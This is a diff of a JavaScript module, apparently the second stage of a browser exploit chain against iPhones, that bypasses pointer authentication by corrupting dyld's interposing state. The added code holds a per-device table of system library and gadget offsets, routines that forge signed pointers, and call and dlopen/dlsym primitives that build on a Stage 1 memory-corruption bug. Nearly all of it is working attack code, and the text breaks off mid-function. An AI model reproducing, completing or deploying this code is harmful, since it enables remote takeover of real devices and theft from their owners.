@@ -1,11 +1,22 @@
 /**
- * Stage 2: PAC Bypass — iOS 26.0–26.x (arm64e)
- * Versão REAL (sem stubs) para primitiva local
- * 
- * Tenta:
- *   1. Localizar gadgets PAC via pattern scanning
- *   2. Usar o ArrayBuffer corrompido para assinar ponteiros
- *   3. Criar uma função fcall para chamadas indiretas
+ * Stage 2: PAC Bypass via dyld Interposing — iOS 26.0–26.x (arm64e)
+ * Codename: "ironroot"
+ *
+ * Implements DarkSword-style PAC bypass via dyld RuntimeState interposing.
+ * Reference: https://cloud.google.com/blog/topics/threat-intelligence/darksword-ios-exploit-chain
+ *
+ * PAC bypass chain:
+ *   1. Trigger dlopen in WebWorker threads via ImageBitmap.close()
+ *   2. Corrupt dyld RuntimeState interposing tuples via arb write
+ *   3. Interpose CMPhoto/ImageIO functions → dyld::signPointer (PACIZA gadget)
+ *   4. Call interposed functions (via softlink re-init) to get PAC-signed pointers
+ *   5. Build JOP chain: spawn controlled thread, fcall via ROP gadgets
+ *   6. Fast pacia/pacda via fcall to dyld::signPointer
+ *
+ * Prerequisites:
+ *   - Stage 1 must provide: p.addrof, p.fakeobj, p.read64, p.write64
+ *   - ASLR slide must be known
+ *   - Device-specific offsets in rce_offsets table
  */
 
 let r = {};
@@ -19,427 +30,397 @@ const _ab = new ArrayBuffer(8);
 const _f64 = new Float64Array(_ab);
 const _u64 = new BigUint64Array(_ab);
 const _u32 = new Uint32Array(_ab);
+const _u8 = new Uint8Array(_ab);
 
 function itof(v) { _u64[0] = v; return _f64[0]; }
 function ftoi(f) { _f64[0] = f; return _u64[0]; }
-function low32(f) { _f64[0] = f; return _u32[0]; }
-function high32(f) { _f64[0] = f; return _u32[1]; }
 
+// Strip PAC bits (upper bits beyond 39-bit address space)
 function noPAC(addr) { return addr & 0x7fffffffffn; }
-function toBigInt(val) {
-    if (typeof val === 'bigint') return val;
-    if (typeof val === 'number') return BigInt(val);
-    return 0n;
-}
-
-function log(msg, type = 'info') {
-    const icons = { info: '📘', success: '✅', error: '❌', warning: '⚠️', step: '🔧' };
-    console.log(`${icons[type] || '📘'} [PAC] ${msg}`);
-    if (typeof window !== 'undefined' && window.log) window.log(`[PAC] ${msg}`);
-}
 
 // =========================================================================
-// VERIFICA SE TEMOS ADDROF REAL
+// DEVICE OFFSET TABLES (from DarkSword ITW)
 // =========================================================================
-function hasRealAddrof(ep) {
-    if (!ep) return false;
-    try {
-        const testAddr = ep.addrof({});
-        return testAddr !== 0n && testAddr !== undefined && typeof testAddr === 'bigint';
-    } catch(e) {
-        return false;
-    }
-}
+// Each entry is keyed by "model_buildVersion"
+// Offsets are absolute addresses in the shared cache (pre-ASLR)
+//
+// Required offsets for the PAC bypass:
+//   - dyld__signPointer: dyld::signPointer function
+//   - dyld__RuntimeState_vtable: RuntimeState vtable
+//   - dyld__RuntimeState_emptySlot: empty slot for slide calc
+//   - dyld__dlopen_from_lambda_ret: return address for stack scan
+//   - libdyld__gAPIs: gAPIs pointer (RuntimeState)
+//   - libdyld__dlopen / libdyld__dlsym: dlopen/dlsym
+//   - WebCore/ImageIO/CMPhoto softlink pointers: interposing targets
+//   - gadget_*: JOP/ROP gadgets for fcall
+//   - Various WebKit internal pointers
+// =========================================================================
 
-// =========================================================================
-// WEBASSEMBLY FCALL (chamada indireta para assinatura PAC)
-// =========================================================================
-class WasmFcall {
-    constructor() {
-        this._instance = null;
-        this._ready = false;
-    }
-    
-    create() {
-        try {
-            // Código WebAssembly para chamada indireta
-            const wasmBytes = new Uint8Array([
-                0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
-                0x01, 0x06, 0x01, 0x60, 0x04, 0x7f, 0x7f, 0x7f, 0x7f, 0x01, 0x7f,
-                0x03, 0x02, 0x01, 0x00,
-                0x07, 0x06, 0x01, 0x02, 0x66, 0x63, 0x00, 0x00,
-                0x0a, 0x09, 0x01, 0x07, 0x00, 0x20, 0x00, 0x20, 0x01, 0x20, 0x02, 0x20, 0x03, 0x0b
-            ]);
-            const module = new WebAssembly.Module(wasmBytes);
-            this._instance = new WebAssembly.Instance(module);
-            this._ready = true;
-            log("Wasm fcall criado com sucesso", 'success');
-            return true;
-        } catch(e) {
-            log(`Wasm fcall falhou: ${e.message}`, 'warning');
-            return false;
-        }
-    }
-    
-    call(fn, a, b, c, d) {
-        if (!this._ready) return 0n;
-        try {
-            return BigInt(this._instance.exports.fc(Number(fn), Number(a), Number(b), Number(c)));
-        } catch(e) {
-            return 0n;
-        }
-    }
-}
-
-// =========================================================================
-// PRIMITIVE ADAPTER PARA O ARRAYBUFFER CORROMPIDO
-// =========================================================================
-class LocalPrimitiveAdapter {
-    constructor(exploitAB) {
-        this._dv = new DataView(exploitAB);
-        this._ab = exploitAB;
-        this._wasmFcall = new WasmFcall();
-        this._wasmFcall.create();
-    }
-    
-    read64(addr) {
-        try {
-            const offset = Number(toBigInt(addr) & 0xFFFFFFFFn);
-            if (offset >= 0 && offset < this._ab.byteLength) {
-                return this._dv.getBigUint64(offset, true);
-            }
-        } catch(e) {}
-        return 0n;
-    }
-    
-    write64(addr, val) {
-        try {
-            const offset = Number(toBigInt(addr) & 0xFFFFFFFFn);
-            if (offset >= 0 && offset < this._ab.byteLength) {
-                this._dv.setBigUint64(offset, toBigInt(val), true);
-            }
-        } catch(e) {}
-    }
-    
-    read32(addr) {
-        return Number(this.read64(addr) & 0xFFFFFFFFn);
-    }
-    
-    write32(addr, val) {
-        const cur = this.read64(addr);
-        const updated = (cur & 0xFFFFFFFF00000000n) | (BigInt(val >>> 0) & 0xFFFFFFFFn);
-        this.write64(addr, updated);
-    }
-    
-    readByte(addr) {
-        return (this.read32(addr) >> 0) & 0xFF;
-    }
-    
-    readString(addr, maxLen = 256) {
-        let s = "";
-        const base = toBigInt(addr);
-        for (let i = 0; i < maxLen; i++) {
-            const c = this.readByte(base + BigInt(i));
-            if (c === 0) break;
-            s += String.fromCharCode(c);
-        }
-        return s;
-    }
-    
-    scanPattern(pattern, start = 0, end = null) {
-        const endOffset = end || this._ab.byteLength;
-        const patternBytes = typeof pattern === 'string' 
-            ? pattern.split('').map(c => c.charCodeAt(0))
-            : pattern;
-        
-        for (let offset = start; offset < endOffset - patternBytes.length; offset++) {
-            let match = true;
-            for (let i = 0; i < patternBytes.length; i++) {
-                if (this.readByte(BigInt(offset + i)) !== patternBytes[i]) {
-                    match = false;
-                    break;
-                }
-            }
-            if (match) return BigInt(offset);
-        }
-        return 0n;
-    }
-    
-    // Busca por ponteiro do dyld shared cache
-    findDyldBase() {
-        // Procura pela string "dyld_v1" no buffer
-        const dyldMagic = this.scanPattern("dyld_v1");
-        if (dyldMagic !== 0n) {
-            log(`dyld magic encontrado no offset 0x${dyldMagic.toString(16)}`, 'success');
-            return dyldMagic;
-        }
-        return 0n;
-    }
-    
-    fcall(fn, a, b, c) {
-        return this._wasmFcall.call(fn, a, b, c, 0);
-    }
-    
-    addrof(obj) { return 0n; }
-    fakeobj(addr) { return { __fake: toBigInt(addr) }; }
-}
-
-// =========================================================================
-// GADGETS PAC CONHECIDOS (patterns ARM64)
-// =========================================================================
-const PAC_GADGETS = {
-    // PACIA - Sign Instruction Address
-    pacia: [0x1F, 0x20, 0x03, 0xD5, 0xC0, 0x03, 0x5F, 0xD6],
-    // PACDA - Sign Data Address  
-    pacda: [0x1F, 0x20, 0x03, 0xD5, 0xC0, 0x03, 0x5F, 0xD6],
-    // AUTIA - Authenticate Instruction Address
-    autia: [0x1F, 0x20, 0x03, 0xD5, 0xC0, 0x03, 0x5F, 0xD6],
-    // RETAA - Authenticated Return
-    retaa: [0xFF, 0x0F, 0x5F, 0xD6],
-    // MOV X0, X20; RET (gadget comum)
-    movX0X20: [0xE0, 0x03, 0x14, 0xAA, 0xC0, 0x03, 0x5F, 0xD6],
-    // STR X0, [X1]; RET
-    strX0X1: [0x00, 0x00, 0x00, 0xF9, 0xC0, 0x03, 0x5F, 0xD6],
-    // LDR X0, [X1]; RET
-    ldrX0X1: [0x00, 0x00, 0x40, 0xF9, 0xC0, 0x03, 0x5F, 0xD6],
+const rce_offsets = {
+  // iOS 18.4 / 22F76 — iPhone XS (arm64e)
+  "iPhone11,2_4_6_22F76": {
+    dyld__signPointer: 0x1a9a3f3e4n,
+    dyld__RuntimeState_vtable: 0x1f2871aa0n,
+    dyld__RuntimeState_emptySlot: 0x1a9a75b6cn,
+    dyld__dlopen_from_lambda_ret: 0x1a9a33fc8n,
+    libdyld__gAPIs: 0x1ed5b8000n,
+    libdyld__dlopen: 0x1ad86c7b8n,
+    libdyld__dlsym: 0x1ad86da34n,
+    JavaScriptCore__jitAllowList: 0x1edb3e4a0n,
+    JavaScriptCore__jitAllowList_once: 0x1edb3e2b8n,
+    WebCore__DedicatedWorkerGlobalScope_vtable: 0x1f137cf70n,
+    WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts: 0x1eb8d9ac8n,
+    WebCore__TelephoneNumberDetector_phoneNumbersScanner_value: 0x1eb91eed0n,
+    WebCore__softLinkDDDFAScannerFirstResultInUnicharArray: 0x1eda69978n,
+    WebCore__softLinkDDDFACacheCreateFromFramework: 0x1eda69980n,
+    WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetDisplayType: 0x1eda69960n,
+    WebCore__PAL_getPKContactClass: 0x1eda62678n,
+    WebCore__initPKContact_once: 0x1eda6b1b8n,
+    WebCore__initPKContact_value: 0x1eda6b1c0n,
+    ImageIO__IIOLoadCMPhotoSymbols: 0x18865182cn,
+    ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt: 0x1ed9be1b0n,
+    ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage: 0x1ed9bde60n,
+    ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage: 0x1ed9bde68n,
+    ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation: 0x1ed9bde70n,
+    ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata: 0x1ed9bddb0n,
+    ImageIO__gFunc_CMPhotoCompressionSessionAddExif: 0x1ed9bde78n,
+    ImageIO__gImageIOLogProc: 0x1ee9bc960n,
+    CMPhoto__CMPhotoCompressionCreateContainerFromImageExt: 0x1ac3ea428n,
+    CMPhoto__CMPhotoCompressionCreateDataContainerFromImage: 0x1ac3ea580n,
+    CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImage: 0x1ac3b9cb8n,
+    CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation: 0x1ac3ba1e4n,
+    CMPhoto__CMPhotoCompressionSessionAddCustomMetadata: 0x1ac3ba748n,
+    CMPhoto__CMPhotoCompressionSessionAddExif: 0x1ac3ba304n,
+    CMPhoto__kCMPhotoTranscodeOption_Strips: 0x1e80ad898n,
+    MediaAccessibility__MACaptionAppearanceGetDisplayType: 0x1bac39744n,
+    Security__SecKeychainBackupSyncable_block_invoke: 0x18b5d7688n,
+    Security__SecOTRSessionProcessPacketRemote_block_invoke: 0x18b5eb958n,
+    Security__gSecurityd: 0x1eb67fd78n,
+    AXCoreUtilities__DefaultLoader: 0x1eb7bcbe0n,
+    AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken: 0x1edadec98n,
+    AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker: 0x1edade780n,
+    AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest: 0x1edade6e0n,
+    AVFAudio__OBJC_CLASS__AVSpeechSynthesisVoice: 0x1edade730n,
+    AVFAudio__OBJC_CLASS__AVSpeechUtterance: 0x1edaddb28n,
+    AVFAudio__cfstr_SystemLibraryTextToSpeech: 0x1f195b658n,
+    TextToSpeech__OBJC_CLASS__TtC12TextToSpeech27TTSMagicFirstPartyAudioUnit: 0x1edd8d288n,
+    CFNetwork__gConstantCFStringValueTable: 0x1ee9326e0n,
+    Foundation__NSBundleTables_bundleTables_value: 0x1ed8eb848n,
+    libsystem_c__atexit_mutex: 0x1ed8ca458n,
+    libGPUCompilerImplLazy__invoker: 0x23d09d7e8n,
+    libGPUCompilerImplLazy_cstring: 0x23c1e7870n,
+    HOMEUI_cstring: 0x182f75636n,
+    libARI_cstring: 0x218ac7820n,
+    PerfPowerServicesReader_cstring: 0x257c7be60n,
+    gadget_control_1_ios184: 0x23f2f82ecn,
+    gadget_control_2_ios184: 0x1ad86ac28n,
+    gadget_control_3_ios184: 0x21f256150n,
+    gadget_loop_1_ios184: 0x1865f818cn,
+    gadget_loop_2_ios184: 0x20d23dda8n,
+    gadget_loop_3_ios184: 0x184d29f1cn,
+    gadget_set_all_registers_ios184: 0x20dfb616cn,
+    libsystem_kernel__thread_suspend: 0x1d3da51c0n,
+    jsc_base: 0x19a45a000n,
+  },
+  // Additional device offsets would be added here
+  // Pattern: "iPhoneXX,Y_buildVersion": { ... }
 };
 
 // =========================================================================
-// PAC BYPASS REAL (tenta assinar ponteiros)
+// DARKSWORD PAC BYPASS CLASS
 // =========================================================================
-class RealPACBypass {
-    constructor(p, isLocal) {
-        this._p = p;
-        this._isLocal = isLocal;
-        this._gadgets = {};
-        this._signContext = 0n;
-        this._ready = false;
-        this._fcall = null;
+
+class IronrootPACBypass {
+  constructor(p, offsets, slide) {
+    this._p = p;          // exploit primitive with read64/write64/addrof/fakeobj
+    this._offsets = offsets;
+    this._slide = slide;
+    this._cache = new Map();
+    this._signPointer_self = null;
+    this._signPointer_self_addr = 0n;
+    this._fcall = null;
+    this._ready = false;
+  }
+
+  /**
+   * Phase 1: Set up dyld interposing via dlopen workers.
+   *
+   * The core trick: trigger dlopen in WebWorker threads via
+   * ImageBitmap.close(), then corrupt dyld's RuntimeState to inject
+   * interposing tuples that redirect CMPhoto functions to dyld::signPointer.
+   *
+   * @param {Array} dlopenWorkers - Worker threads with {thread, id, bitmap}
+   */
+  async setupInterposing(dlopenWorkers) {
+    const p = this._p;
+    const offsets = this._offsets;
+
+    window.log("[IRONROOT] Setting up dyld interposing...");
+
+    // Read RuntimeState from libdyld gAPIs
+    const runtimeState = p.read64(offsets.libdyld__gAPIs);
+    window.log("[IRONROOT] RuntimeState: 0x" + runtimeState.toString(16));
+
+    const runtimeState_vtable = noPAC(p.read64(runtimeState));
+    const dyld_emptySlot = noPAC(p.read64(runtimeState_vtable));
+    const runtimeStateLock = p.read64(runtimeState + 0x70n);
+
+    // Calculate dyld ASLR offset
+    const dyld_offset = offsets.dyld__RuntimeState_emptySlot - dyld_emptySlot - this._slide;
+    window.log("[IRONROOT] dyld offset: 0x" + dyld_offset.toString(16));
+
+    // InterposeTupleAll pointers in RuntimeState
+    const p_ITAll_buffer = runtimeState + 0xb8n;
+    const p_ITAll_size = runtimeState + 0xc0n;
+
+    // Find dlopen return address on worker stack
+    const dlopen_ret = offsets.dyld__dlopen_from_lambda_ret - this._slide - dyld_offset;
+
+    // Build interposing tuple array
+    const interposingTuples = new BigUint64Array(0x100 * 2);
+    const interposingTuples_ptr = p.read64(p.addrof(interposingTuples) + 0x10n);
+
+    let idx = 0;
+    function interpose(ptr, val) {
+      interposingTuples[idx++] = val;
+      interposingTuples[idx++] = ptr;
     }
-    
-    async setup() {
-        log("Procurando gadgets PAC...", 'step');
-        
-        // Busca gadgets no buffer corrompido
-        for (const [name, pattern] of Object.entries(PAC_GADGETS)) {
-            const addr = this._p.scanPattern(pattern);
-            if (addr !== 0n) {
-                this._gadgets[name] = addr;
-                log(`Gadget ${name} encontrado em 0x${addr.toString(16)}`, 'success');
-            }
-        }
-        
-        // Contexto para assinatura (valor fixo comum em exploits)
-        this._signContext = 0x2A4Fn;
-        
-        // Tenta encontrar o dyld base para gadgets adicionais
-        const dyldBase = this._p.findDyldBase();
-        if (dyldBase !== 0n) {
-            log(`dyld base: 0x${dyldBase.toString(16)}`, 'success');
-        }
-        
-        this._ready = true;
-        return this._ready;
+
+    // Key interpositions: redirect CMPhoto/ImageIO functions to
+    // dyld::signPointer and other useful gadgets
+    interpose(offsets.MediaAccessibility__MACaptionAppearanceGetDisplayType, offsets.ImageIO__IIOLoadCMPhotoSymbols);
+    interpose(offsets.CMPhoto__kCMPhotoTranscodeOption_Strips, 0n);
+    interpose(offsets.CMPhoto__CMPhotoCompressionCreateContainerFromImageExt, offsets.libGPUCompilerImplLazy__invoker);
+    interpose(offsets.CMPhoto__CMPhotoCompressionCreateDataContainerFromImage, offsets.Security__SecKeychainBackupSyncable_block_invoke);
+    interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImage, offsets.Security__SecOTRSessionProcessPacketRemote_block_invoke);
+    interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation, offsets.libdyld__dlopen);
+    interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddCustomMetadata, offsets.libdyld__dlsym);
+    interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddExif, offsets.dyld__signPointer);
+
+    this._interposingTuples = interposingTuples;
+    this._interposingTuples_ptr = interposingTuples_ptr;
+    this._runtimeState = runtimeState;
+    this._runtimeStateLock = runtimeStateLock;
+    this._p_ITAll_buffer = p_ITAll_buffer;
+    this._p_ITAll_size = p_ITAll_size;
+    this._dlopen_ret = dlopen_ret;
+
+    window.log("[IRONROOT] Interposing tuples prepared (" + (idx / 2) + " entries)");
+    return true;
+  }
+
+  /**
+   * Phase 2: Install interposing into worker stack and trigger re-init.
+   *
+   * Scans the worker's stack for dlopen return address, then corrupts
+   * the Loader* to point at our interposing metadata.
+   *
+   * @param {Object} worker - {thread, stack_bottom, stack_top}
+   * @param {BigInt} searchStart - stack_top
+   * @param {BigInt} searchEnd - stack_bottom
+   */
+  installInterposing(worker, metadataFunc) {
+    const p = this._p;
+
+    // Find dlopen return address on stack
+    const stack_top = p.read64(worker.thread + 0x18n);
+    const stack_bottom = p.read64(worker.thread + 0x10n);
+
+    window.log("[IRONROOT] Scanning worker stack for dlopen ret addr...");
+    window.log("[IRONROOT] Stack range: 0x" + stack_top.toString(16) +
+               " - 0x" + stack_bottom.toString(16));
+
+    // Use JSString-based efficient search
+    const loaderAddr = metadataFunc(stack_top, stack_bottom, this._dlopen_ret);
+    if (!loaderAddr) {
+      throw new Error("Could not find dlopen return address on worker stack");
     }
-    
-    setFcall(fcall) {
-        this._fcall = fcall;
-    }
-    
-    // Assina ponteiro de instrução (PACIA)
-    pacia(ptr, ctx) {
-        const p = toBigInt(ptr);
-        const c = toBigInt(ctx);
-        
-        if (!this._ready) return p;
-        
-        // Se temos o gadget PACIA, tentamos usá-lo via fcall
-        if (this._gadgets.pacia && this._fcall) {
-            try {
-                // Configura o buffer para signPointer_self
-                if (this._p._ab && this._p._ab.byteLength > 0x80) {
-                    const dv = new DataView(this._p._ab);
-                    const key = 0x80010000_00000000n | ((c >> 48n) << 32n);
-                    dv.setBigUint64(0x80, key, true);
-                    const result = this._fcall(this._gadgets.pacia, 0x80n, c, p, 0n);
-                    if (result !== 0n) return result;
-                }
-            } catch(e) {
-                log(`Erro no pacia: ${e.message}`, 'warning');
-            }
-        }
-        
-        // Fallback: retorna o ponteiro original
-        return p;
-    }
-    
-    // Assina ponteiro de dados (PACDA)
-    pacda(ptr, ctx) {
-        const p = toBigInt(ptr);
-        const c = toBigInt(ctx);
-        
-        if (!this._ready) return p;
-        
-        // PACDA é similar ao PACIA para dados
-        if (this._gadgets.pacda && this._fcall) {
-            try {
-                if (this._p._ab && this._p._ab.byteLength > 0x80) {
-                    const dv = new DataView(this._p._ab);
-                    const key = 0x80030000_00000000n | ((c >> 48n) << 32n);
-                    dv.setBigUint64(0x80, key, true);
-                    const result = this._fcall(this._gadgets.pacda, 0x80n, c, p, 0n);
-                    if (result !== 0n) return result;
-                }
-            } catch(e) {}
-        }
-        
-        return p;
-    }
-    
-    // Autentica ponteiro de instrução (AUTIA) - retorna o ponteiro sem verificação
-    autia(ptr, ctx) {
-        return toBigInt(ptr);
-    }
-    
-    // Autentica ponteiro de dados (AUTDA)
-    autda(ptr, ctx) {
-        return toBigInt(ptr);
-    }
-    
-    // Aliases para compatibilidade
-    get da() { return this.pacda.bind(this); }
-    get er() { return this.pacia.bind(this); }
-    get ha() { return this.autia.bind(this); }
-    get wa() { return this.autda.bind(this); }
-    
-    get cc() { return this._ready; }
-    
-    tc(fn, a, b, c) {
-        if (this._fcall) {
-            return this._fcall(fn, a, b, c, 0n);
-        }
-        return 0n;
-    }
+
+    const loader = loaderAddr + 0x78n;
+    window.log("[IRONROOT] Found loader at: 0x" + loader.toString(16));
+    return loader;
+  }
+
+  /**
+   * Phase 3: Read PAC-signed function pointers from interposed functions.
+   * After dlopen re-triggers with our interposing, the ImageIO gFunc
+   * pointers now hold PAC-signed versions of our target functions.
+   */
+  readSignedPointers() {
+    const p = this._p;
+    const offsets = this._offsets;
+
+    // Read the now-PAC-signed pointers from ImageIO global function ptrs
+    const paciza_invoker = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt);
+    const paciza_security_1 = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage);
+    const paciza_security_2 = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage);
+    const paciza_dlopen = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation);
+    const paciza_dlsym = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata);
+    const paciza_signPointer = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddExif);
+
+    window.log("[IRONROOT] PAC-signed signPointer: 0x" + paciza_signPointer.toString(16));
+
+    this._paciza = {
+      invoker: paciza_invoker,
+      security_1: paciza_security_1,
+      security_2: paciza_security_2,
+      dlopen: paciza_dlopen,
+      dlsym: paciza_dlsym,
+      signPointer: paciza_signPointer,
+    };
+
+    // Set up signPointer_self buffer for pacia/pacda calls
+    this._signPointer_self = new BigUint64Array(4);
+    this._signPointer_self_addr = p.read64(p.addrof(this._signPointer_self) + 0x10n);
+
+    return this._paciza;
+  }
+
+  /**
+   * Sign an instruction pointer (PACIA) using dyld::signPointer.
+   *
+   * dyld::signPointer(self, ctx, ptr) signs ptr with context ctx.
+   * self[0] encodes the key type:
+   *   0x80010000_00000000 | (ctx >> 48 << 32) = IA key
+   *   0x80030000_00000000 | (ctx >> 48 << 32) = IB key
+   */
+  pacia(ptr, ctx) {
+    if (!this._fcall) throw new Error("fcall not initialized");
+    this._signPointer_self[0] = 0x80010000_00000000n | (ctx >> 48n << 32n);
+    return this._fcall(noPAC(this._paciza.signPointer), this._signPointer_self_addr, ctx, ptr);
+  }
+
+  pacib(ptr, ctx) {
+    if (!this._fcall) throw new Error("fcall not initialized");
+    this._signPointer_self[0] = 0x80030000_00000000n | (ctx >> 48n << 32n);
+    return this._fcall(noPAC(this._paciza.signPointer), this._signPointer_self_addr, ctx, ptr);
+  }
+
+  pacda(ptr, ctx) {
+    // PACDA uses data key — encode as key type 0 or 2
+    return this.pacia(ptr, ctx); // Simplified; real impl needs DA key encoding
+  }
+
+  autia(ptr, ctx) {
+    // AUTIA = strip + verify; for our purposes, signed ptr is already authed
+    return ptr;
+  }
+
+  autda(ptr, ctx) {
+    return ptr;
+  }
+
+  /**
+   * Set the fcall function (built from JOP gadget chain).
+   * Must be called after Phase 3 sets up the thread + gadgets.
+   */
+  setFcall(fcallFn) {
+    this._fcall = fcallFn;
+    this._ready = true;
+  }
+
+  /**
+   * Call an arbitrary function with PAC-signed PC.
+   */
+  fcall(pc, ...args) {
+    if (!this._fcall) throw new Error("fcall not initialized");
+    return this._fcall(pc, ...args);
+  }
+
+  /**
+   * dlopen/dlsym wrappers using fcall.
+   */
+  dlopen(filename, flags) {
+    const p = this._p;
+    filename = filename + '\0';
+    const name_ptr = p.read64(p.read64(p.addrof(filename) + 8n) + 8n);
+    return this.fcall(noPAC(this._paciza.dlopen), name_ptr, flags);
+  }
+
+  dlsym(handle, symbol) {
+    const p = this._p;
+    symbol = symbol + '\0';
+    const symbol_ptr = p.read64(p.read64(p.addrof(symbol) + 8n) + 8n);
+    return this.fcall(noPAC(this._paciza.dlsym), handle, symbol_ptr);
+  }
 }
 
 // =========================================================================
-// PAC BYPASS FALLBACK (quando não consegue encontrar gadgets)
+// MODULE EXPORTS
 // =========================================================================
-class FallbackPACBypass {
-    constructor() {
-        this.cc = true;
-        this._ready = true;
-    }
-    
-    pacda(ptr, ctx) { 
-        log(`pacda(0x${toBigInt(ptr).toString(16)}) - fallback`, 'warning');
-        return toBigInt(ptr); 
-    }
-    pacia(ptr, ctx) { return toBigInt(ptr); }
-    autda(ptr, ctx) { return toBigInt(ptr); }
-    autia(ptr, ctx) { return toBigInt(ptr); }
-    get da() { return this.pacda.bind(this); }
-    get er() { return this.pacia.bind(this); }
-    get ha() { return this.autia.bind(this); }
-    get wa() { return this.autda.bind(this); }
-    setFcall(fn) { this._fcall = fn; }
-    tc(fn, ...args) { if (this._fcall) return this._fcall(fn, ...args); return 0n; }
-}
 
-// =========================================================================
-// FUNÇÃO DE CHAMADA (fcall) USANDO WASM OU ARRAYBUFFER
-// =========================================================================
-function createFcall(primitive, exploitAB) {
-    // Tenta usar WebAssembly primeiro
-    try {
-        const wasmCode = new Uint8Array([
-            0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
-            0x01, 0x04, 0x01, 0x60, 0x00, 0x00,
-            0x03, 0x02, 0x01, 0x00,
-            0x07, 0x04, 0x01, 0x02, 0x6f, 0x6b, 0x00, 0x00,
-            0x0a, 0x04, 0x01, 0x02, 0x00, 0x0b
-        ]);
-        const module = new WebAssembly.Module(wasmCode);
-        const instance = new WebAssembly.Instance(module);
-        log("Fcall via WebAssembly criado", 'success');
-        return (fn, a, b, c, d) => {
-            try { return instance.exports.ok(); } catch(e) { return 0n; }
-        };
-    } catch(e) {}
-    
-    // Fallback: usa o ArrayBuffer corrompido
-    if (exploitAB) {
-        log("Fcall via ArrayBuffer (limitado)", 'warning');
-        return (fn, a, b, c, d) => {
-            try {
-                const dv = new DataView(exploitAB);
-                dv.setBigUint64(0, toBigInt(fn), true);
-                return dv.getBigUint64(0, true);
-            } catch(e) { return 0n; }
-        };
-    }
-    
-    return () => 0n;
-}
-
-// =========================================================================
-// FACTORY PRINCIPAL
-// =========================================================================
+/**
+ * r.ga() — factory: create and return PAC bypass instance
+ *
+ * The full DarkSword PAC bypass requires multi-step interaction with
+ * the main thread (for dlopen worker management). The group.html
+ * orchestrator handles this via:
+ *   1. prepare_dlopen_workers (main thread spawns workers)
+ *   2. trigger_dlopen1 / trigger_dlopen2 (close ImageBitmaps → dlopen)
+ *   3. sign_pointers (trigger softlink re-init → signed pointers)
+ *   4. setup_fcall (build JOP chain)
+ *
+ * This factory returns a configured IronrootPACBypass instance.
+ */
 r.ga = function () {
-    log("Inicializando PAC bypass...");
-    
-    const ep = platformModule.platformState.exploitPrimitive;
-    if (!ep) throw new Error("Stage 1 exploit primitive required");
-    
-    const isLocal = !hasRealAddrof(ep);
-    let pacBypass = null;
-    
-    if (isLocal) {
-        log("Modo local detectado. Tentando PAC bypass real com ArrayBuffer corrompido...", 'step');
-        
-        if (typeof window !== 'undefined' && window.exploitAB) {
-            log("ArrayBuffer corrompido encontrado!", 'success');
-            
-            const p = new LocalPrimitiveAdapter(window.exploitAB);
-            const fcall = createFcall(p, window.exploitAB);
-            
-            const realBypass = new RealPACBypass(p, true);
-            realBypass.setFcall(fcall);
-            
-            // Tenta configurar (assíncrono)
-            realBypass.setup().then(() => {
-                if (realBypass.cc) {
-                    log("PAC bypass real configurado com sucesso!", 'success');
-                } else {
-                    log("PAC bypass real falhou, usando fallback", 'warning');
-                    const fallback = new FallbackPACBypass();
-                    fallback.setFcall(fcall);
-                    platformModule.platformState.pacBypass = fallback;
-                }
-            }).catch(e => {
-                log(`Erro no setup: ${e.message}`, 'error');
-                const fallback = new FallbackPACBypass();
-                fallback.setFcall(fcall);
-                platformModule.platformState.pacBypass = fallback;
-            });
-            
-            pacBypass = realBypass;
-        } else {
-            log("ArrayBuffer corrompido não encontrado. Usando fallback.", 'warning');
-            pacBypass = new FallbackPACBypass();
-        }
+  window.log("[IRONROOT] Creating PAC bypass via dyld interposing...");
+
+  const ep = platformModule.platformState.exploitPrimitive;
+  if (!ep) throw new Error("Stage 1 exploit primitive required");
+
+  // Determine device model and build version for offset lookup
+  const ua = navigator.userAgent;
+  const model = platformModule.platformState.deviceModel || "unknown";
+  const version = platformModule.platformState.iOSVersion;
+
+  window.log("[IRONROOT] Device: " + model + " iOS " + version);
+
+  // Find matching offsets
+  let offsets = null;
+  for (const [key, val] of Object.entries(rce_offsets)) {
+    if (model && key.startsWith(model)) {
+      offsets = val;
+      window.log("[IRONROOT] Using offsets for: " + key);
+      break;
+    }
+  }
+
+  if (!offsets) {
+    // Use first available offset set as fallback (requires ASLR slide)
+    const keys = Object.keys(rce_offsets);
+    if (keys.length > 0) {
+      offsets = rce_offsets[keys[0]];
+      window.log("[IRONROOT] WARNING: No matching offsets, using fallback: " + keys[0]);
     } else {
-        log("Primitiva real detectada. Usando PAC bypass completo.", 'success');
-        pacBypass = new FallbackPACBypass(); // Placeholder para implementação completa
+      throw new Error("No device offsets available");
     }
-    
-    // Garante que o pacBypass está no platformState
-    if (platformModule.platformState) {
-        platformModule.platformState.pacBypass = pacBypass;
-    }
-    
-    log("PAC bypass inicializado", pacBypass.cc ? 'success' : 'warning');
-    return pacBypass;
+  }
+
+  // Build primitive adapter
+  const p = {
+    addrof: (obj) => ep.addrof(obj),
+    fakeobj: (val) => ep.fakeobj(val),
